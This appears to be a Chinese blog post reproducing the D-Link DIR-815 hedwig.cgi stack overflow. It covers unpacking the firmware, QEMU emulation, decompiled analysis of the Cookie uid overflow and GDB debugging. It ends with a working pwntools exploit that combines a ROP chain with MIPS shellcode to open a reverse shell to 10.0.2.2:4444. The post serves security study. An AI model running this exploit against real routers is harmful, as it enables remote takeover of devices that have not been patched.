---
title: "DIR-815 栈溢出漏洞复现"
description: "学习 IOT 的第一步，复现经典漏洞"
pubDate: 2026-05-21
category: iot
tags: [iot]
---

参考文献
	- [IoT 安全从零到掌握：超详尽入门指南（实战篇）-先知社区](https://xz.aliyun.com/news/15948)
	- [[原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪安全社区｜专业技术交流与安全研究论坛](https://bbs.kanxue.com/thread-272318.htm)

## 固件分离
由于是复现，网上直接下载[固件](https://rebyte.me/en/d-link/89510/file-592084/)，然后直接分离，先使用 binwalk 查看内容
```bash
➜  dir815_FW_101 binwalk ./DIR-815_FW_1.01b14.bin
---------------------------------------------------------------------------
DECIMAL         HEXADECIMAL     DESCRIPTION
---------------------------------------------------------------------------
0               0x0             DLOB firmware header, 
								header size: 108 bytes, 
								data size: 3792928

108             0x6C            LZMA compressed data, 
								properties: 0x5D, 
								dictionary size: 33554432 bytes, 
								compressed size: 979100 bytes, 
								uncompressed size: 3017436 bytes

983180          0xF008C         SquashFS file system, little endian, 
								version: 4.0, compression: lzma, 
                                inode count: 1526, block size: 262144, 
                                image size: 2808054 bytes, 
                                created: 2011-05-12 14:14:40
---------------------------------------------------------------------------
Analyzed 1 file for 85 file signatures (187 magic patterns) in 131.0 milliseconds
```
看到三个部分：
- D-Link 固件头部
- LZMA 压缩数据块
- 根文件系统 rootfs
> 提取文件系统前，须安装 sasquatch

提取方法：
```bash
sudo binwalk -e ./DIR-815_FW_1.01b14.bin
# 或者用 dd 命令
dd if=DIR-815_FW_1.01b14.bin of=squashfs.sqsh bs=1 skip=$((0xF008C)) status=progress
sudo sasquatch ./squashfs.sqsh 
```
使用 sudo 是因为，文件系统可能有 /dev/ 之类的东西，

## 仿真运行
### 下载内核文件
点击[下载地址](https://people.debian.org/~aurel32/qemu/mipsel/)

下载 vmlinux-3.2.0-4-4kc-malta 和 vmlinux-2.6.32-5-4kc-malta 都可，固件中的内核是 2.6 的，但是笔者下载的是 3.2。

### 构建文件系统
上一步中，已经获得了 ./squashfs.sqsh，也就是 SquashFS file system，为了适配内核，得转成 ext2

64M 应该够了，不够就改大
```bash
mkdir mnt
dd if=/dev/zero of=rootfs.ext2 bs=1M count=64 

sudo mount -o loop rootfs.ext2 mnt
```

然后在 mnt/ 目录下，创建 init 文件，内容如下
```sh
#!/bin/sh

echo "[+] custom /init started"

mount -t proc proc /proc
mount -t sysfs sysfs /sys
mkdir -p /dev/pts 2>/dev/null
mount -t devpts devpts /dev/pts 2>/dev/null

echo "[+] setup /var"
mkdir -p /var 2>/dev/null
mount -t ramfs ramfs /var 2>/dev/null
mkdir -p /var/tmp /var/run /var/etc /var/log
chmod 777 /var/tmp

echo "[+] configure eth0"
ifconfig eth0 10.0.2.15 netmask 255.255.255.0 up
route add default gw 10.0.2.2 2>/dev/null

echo "[+] network status"
ifconfig eth0
route -n

if [ -f /htdocs/httpd.conf ]; then
    echo "Starting HTTPD..."
    /sbin/httpd -n -f /htdocs/httpd.conf &
else
    echo "Error: httpd.conf missing!"
fi

echo "[+] starting shell"
exec /bin/sh
```

在 mnt/htdocs/ 目录下，创建 httpd.conf ，内容如下
```
Umask 026
PIDFile /var/run/httpd.pid

Tuning
{
    NumConnections 15
    InputBufSize 16384
    BufSize 32768
    ScriptBufSize 4096
    NumHeaders 100
    Timeout 60
    ScriptTimeout 60
}

Control
{
    Types
    {
        text/html       { html htm }
        text/xml        { xml }
        text/plain      { txt }
        image/gif       { gif }
        image/jpeg      { jpg }
        text/css        { css }
        application/javascript { js }
        application/octet-stream { * }
    }

    Specials
    {
        Dump            { /dump }
        CGI             { cgi }
        Imagemap        { map }
        Redirect        { url }
    }

    External
    {
        /usr/sbin/phpcgi { php }
    }
}

Server
{
    ServerName "Linux, HTTP/1.1, QEMU Ver test"
    ServerId "LAN-1"
    Family inet
    Interface eth0
    Address 0.0.0.0
    Port 80

    Virtual
    {
        AnyHost

        Control
        {
            Alias /
            Location /htdocs/web
            IndexNames { index.php index.html }

            External
            {
                /usr/sbin/phpcgi { php }
                /usr/sbin/phpcgi { router_info.xml }
                /usr/sbin/phpcgi { post_login.xml }
            }

            Specials
            {
                CGI { cgi }
            }
        }

        Control
        {
            Alias /HNAP1
            Location /htdocs/HNAP1

            External
            {
                /usr/sbin/hnap { hnap }
            }

            IndexNames { index.hnap }
        }
    }
}
```

然后使用 `sudo chmod 750 init`修改 init 的权限为 750 。


传入一个 静态编译的 gdbserver 到 mnt 目录下。
下载链接：[Releases · guyush1/gdb-static](https://github.com/guyush1/gdb-static/releases)


最后，解除挂载： `sudo umont mnt` 。

### 运行
创建 run.sh，内容如下
```sh
#!/bin/sh
qemu-system-mipsel \
  -M malta \
  -kernel vmlinux \
  -drive file=rootfs.ext2,format=raw,if=ide \
  -append "root=/dev/sda rw rootfstype=ext2 console=ttyS0 init=/init" \
  -netdev user,id=n0,hostfwd=tcp::6666-:80,hostfwd=tcp::1234-:1234 \
  -device pcnet,netdev=n0 \
  -nographic
```

转发了 80、1234 两个端口为本地的 6666 和 1234。
前者用于访问 web 服务，后者用于远程调试，可以访问 `http://127.0.0.1:6666/hedwig.cgi` 看看效果。

## 漏洞程序分析
`/htdocs/web/hedwig.cgi` ，但是是软链接到 `/htdocs/cgibin`


### hedwigcgi_main
使用 ida 打开
```C
if ( !strcmp(v3, "hedwig.cgi") )
{
    v8 = &hedwigcgi_main;
    v9 = argc;
    return v8(v9, argv, envp);
}
```

查看 hedwigcgi_main，注意到
```C
...
char v27[1024]; // [sp+C0h] [-400h] BYREF
...
v20 = sobj_get_string(v4);
sprintf(v27, "/htdocs/webinc/fatlady.php\nprefix=%s/%s", "/runtime/session", v20);
xmldbc_ephp(0, 0, v27, stdout);
...
```
sprintf 存在溢出的可能，%s 并未限定长度，v27 数组大小才 1024，如果 v20 长度足够就能溢出，向上追溯 v20。

```C
char *__fastcall sobj_get_string(int a1)
{
  int v1; // $v1

  v1 = 0;
  if ( a1 )
  {
    v1 = *(a1 + 20);
    if ( !v1 )
      return "";
  }
  return v1;
}
```
看起来 v20，只是 v4 指向结构体的指针字段，继续追溯 v4

```C
v4 = sobj_new();
v5 = sobj_new();
v3 = v5;
if ( !v4 || !v5 )
{
res = "unable to allocate string object";
goto LABEL_34;
}
sess_get_uid(v4);
```
v4 的内容在 sess_get_uid 中被修改。

### sess_get_uid
简单修改后，内容大致如下
```C
void __fastcall sess_get_uid(sobj *ptr)
{
  sobj *key_obj; // $s2
  char *HTTP_COOKIE; // $v0
  sobj *val_obj; // $s3
  char *HTTP_COOKIE_ptr; // $s4
  int flag; // $s1
  int val; // $s0
  char *string; // $v0

  key_obj = sobj_new();
  val_obj = sobj_new();
  HTTP_COOKIE = getenv("HTTP_COOKIE");
  if ( !key_obj )
    goto LABEL_27;
  if ( !val_obj )
    goto LABEL_27;
  HTTP_COOKIE_ptr = HTTP_COOKIE;
  if ( !HTTP_COOKIE )
    goto LABEL_27;
  flag = 0;
  while ( 1 )
  {
    val = *HTTP_COOKIE_ptr;
    if ( !*HTTP_COOKIE_ptr )
      break;
    if ( flag == 1 )
      goto LABEL_11;
    if ( flag < 2 )
    {
      if ( val == ' ' )
        goto LABEL_18;
      sobj_free(key_obj);
      sobj_free(val_obj);
LABEL_11:
      if ( val == ';' )
      {
        flag = 0;
      }
      else
      {
        flag = 2;
        if ( val != '=' )
        {
          sobj_add_char(key_obj, val);
          flag = 1;
        }
      }
      goto LABEL_18;
    }
    if ( flag == 2 )
    {
      if ( val == ';' )
      {
        flag = 3;
        goto LABEL_18;
      }
      sobj_add_char(val_obj, *HTTP_COOKIE_ptr++);
    }
    else
    {
      flag = 0;
      if ( !sobj_strcmp(key_obj, "uid") )
        goto end;
LABEL_18:
      ++HTTP_COOKIE_ptr;
    }
  }
  if ( !sobj_strcmp(key_obj, "uid") )
  {
end:
    string = sobj_get_string(val_obj);
    goto LABEL_22;
  }
LABEL_27:
  string = getenv("REMOTE_ADDR");
LABEL_22:
  sobj_add_string(ptr, string);
  if ( key_obj )
    sobj_del(key_obj);
  if ( val_obj )
    sobj_del(val_obj);
}
```
总之，就是找 **HTTP_COOKIE** 环境变量中的形似于 _uid=xxxxxxxxxxxxx_ 的内容，然后把 = 后面的给到 `ptr`，也就是上文的 `v4` 。

容易想到利用 HTTP_COOKIE 进行栈溢出利用。


## 漏洞复现

### 调试方案
使用 run.sh 启动服务后，使用 ps 查看 httpd 进程的 pid，然后使用 gdbserver 附加
```bash
/gdbserver 0.0.0.0:1234 --attach <pid>
```

然后在宿主机上使用 `gdb-multiarch ./hedwig.cgi` 调试，然后用 `target remote :1234` 连接远程。


### 漏洞利用
经过分析，知道是 mips 栈溢出利用，为了成功运行到 sprintf，还需要一些额外的准备
```C
v20 = sobj_get_string(v4);
sprintf(v27, "/htdocs/webinc/fatlady.php\nprefix=%s/%s", "/runtime/session", v20);
xmldbc_ephp(0, 0, v27, stdout);
```

#### 第一个注意点
```C
...
	REQUEST_METHOD = getenv("REQUEST_METHOD");
	if ( !REQUEST_METHOD ) {
	    v1 = "no REQUEST";
LABEL_7:
	    obj_2 = 0;
	    obj1 = 0;
LABEL_34:
	    v9 = -1;
    goto LABEL_25;
	}
	if ( strcasecmp(REQUEST_METHOD, "POST") ) {
    v1 = "unsupported HTTP request";
    goto LABEL_7;
	}
...
LABEL_25:
	    printf("HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n<hedwig><result>FAILED</result><message>%s</message></hedwig>",
	    v1);
	}
LABEL_26:
	if ( haystack )
	    free(haystack);
	if ( obj_2 )
	    sobj_del(obj_2);
	if ( obj1 )
	    sobj_del(obj1);
	return v9;
}
```
必须满足是 POST 请求方法

#### 第二个注意点
注意到有对 haystack 变量的检测
```C
if ( !haystack )
{
    v1 = "no xml data.";
    goto LABEL_34;
}
```

这个变量可以通过 **cgibin_parse_request -> sub_403B10 -> sub_402FFC -> sub_402B40 -> sub_409A6C** 的路径赋值（实际上是 `hedwigcgi_main` 中，`cgibin_parse_request` 将 `sub_409A6C` 函数指针作为参数传递，最后在 `sub_402B40` 触发 `sub_409A6C`）

简单修复 cgibin_parse_request，内容如下（省去了一部分）
```C
int __fastcall cgibin_parse_request(void (*func)(), int num, unsigned int a3)
{
...

	if ( getenv("CONTENT_TYPE") && (CONTENT_LENGTH_STR = getenv("CONTENT_LENGTH")) != 0 )
	    CONTENT_LENGTH = atoi(CONTENT_LENGTH_STR);
	else
	    CONTENT_LENGTH = 0;
	v20.k_obj = sobj_new();
    v8 = sobj_new();
    v20.v_obj = v8;
	v9 = -1;
	if ( v20.k_obj && v8 ) {
	    v10 = getenv("REQUEST_URI");
    if ( v10 )
    {
      v11 = strchr(v10, 63);
      v9 = 0;
      if ( v11 )
      {
        ...
        v9 = 0;
      }
    }
    else
    {
      v9 = -1;
    }
  }
...
  if ( v9 != -1 )
  {
    if ( a3 >= CONTENT_LENGTH )
    {
      if ( CONTENT_LENGTH )
      {
        getenv("CONTENT_TYPE");
        CONTENT_TYPE = getenv("CONTENT_TYPE");
        if ( CONTENT_TYPE )
        {
          func_stru = funcs;
          idx = 0;
          while ( 1 )
          {
            path = func_stru->path;
            if ( !func_stru->path )
              break;
            len = func_stru->len;
            ++func_stru;
            ++idx;
            if ( !strncasecmp(CONTENT_TYPE, path, len) )
              return (funcs[idx - 1].fun)(func, num, CONTENT_LENGTH, &CONTENT_TYPE[len]);
          }
        }
        return -1;
      }
    }
    else
    {
      sub_402CE8(CONTENT_LENGTH);
      return -100;
    }
  }
  return v9;
}
```
在 `(funcs[idx - 1].fun)(func, num, CONTENT_LENGTH, &CONTENT_TYPE[len])` 触发函数指针，对应的 path 是 **application/**


```C
int __fastcall sub_403B10(void (*func)(), int num, size_t len, const char *str) {
	if ( !strncasecmp(str, "x-www-form-urlencoded", 0x15u) )
	    return sub_402FFC(func, num, len);
	sub_402CE8(len);
	sub_403794("read_ct_application", str);
	return -1;
}
```
为了触发 `sub_402FFC(func, num, len)` ，需要 str 为 **x-www-form-urlencoded**，也就是上面的 `&CONTENT_TYPE[len]` 是**x-www-form-urlencoded** 。

综上，*CONTENT_TYPE* （对应请求的 Content-Type 字段）为 **application/x-www-form-urlencoded**

#### 尝试调试
首先，连接上调试，加上断点，然后 `continue` 继续运行，最后使用 python 脚本发信
```python
import requests
from pwn import *

url = "http://127.0.0.1:6666/hedwig.cgi"
solid = "/htdocs/webinc/fatlady.php\nprefix=/runtime/session/"
slen = len(solid)

payload = (1024+9*4 - slen)*b"A"
payload += b'\x66'

data = {"atker": "fun"}
header = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": b"uid=" + payload
}
res = requests.post(url = url, data = data, headers = header)
```
就能看到程序停在断点处。

> 注意：payload 不要写 \x00 这样的内容，会阶段，\x09 好像也会被处理成 \x20。

### 反弹 shell
上面提供的脚本刚好覆盖返回地址最低位为 0x66，修改为其他内容就能实现任意地址跳转。

~~mips rop 就不细讲了，无非是 gadget 凑 ROP。~~

这里采用 ROP+shellcode 反弹 shell 的方法，记得另开一个终端监听 4444 端口：`nc -lvnp 4444`
```python
import requests
from pwn import *

context.arch = "mips"
context.endian = "little"
context.os = "linux"

url = "http://127.0.0.1:6666/hedwig.cgi"
solid = "/htdocs/webinc/fatlady.php\nprefix=/runtime/session/"
slen = len(solid)

libc = 0x77f34000

# move $t9, $a1 ; addiu $a0, $a0, 0x4c ; jr $t9 ; move $a1, $a2
gad1 = 0x37E6C + libc
# addiu $a1, $sp, 0x18 ; move $t9, $s4 ; jalr $t9 ; move $s5, $v0
gad2 = 0x3B974 + libc

binsh = 0x5A448 + libc
printf = 0x2D890 + libc
system = 0x53200 + libc

print("gad1: " + hex(gad1))
print("gad2: " + hex(gad2))
print("binsh: " + hex(binsh))
print("printf: " + hex(printf))

ip = "10.0.2.2"
port = 4444

sc  = shellcraft.mips.linux.connect(ip, port)
sc += shellcraft.mips.linux.dup2("$s0", 0)
sc += shellcraft.mips.linux.dup2("$s0", 1)
sc += shellcraft.mips.linux.dup2("$s0", 2)

sc += f"""
    li $a0, {binsh}
    addiu $sp, $sp, -8
    sw $a0, 0x360($sp)
    xor $s2, $s2, $s2
    sw $s2, 0x364($sp)
    addiu $a1, $sp, 0x360
    slti $a2, $zero, 0xFFFF
    li $v0, 0xfab
    syscall 0x40404
"""

shellcode = asm(sc)


# print("shellcode length: " + str(len(shellcode)))
# print(b"shellcode: " + shellcode)

payload = (1024 - slen)*b"A"
payload += 4*b"B"
payload += 4*b"C"
payload += 4*b"D"
payload += 4*b"E"
payload += p32(gad1)
payload += 4*b"G"
payload += 4*b"H"
payload += 4*b"I"
payload += 4*b"J"
payload += p32(gad2)
payload += 4*b"L"
payload += 4*b"M"
payload += 4*b"N"
payload += 4*b"O"
payload += 4*b"P"
payload += 4*b"Q"
payload += shellcode


data = {"atker": "fun"}
header = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": b"uid=" + payload
}
res = requests.post(url = url, data = data, headers = header)
print(res.text)
```
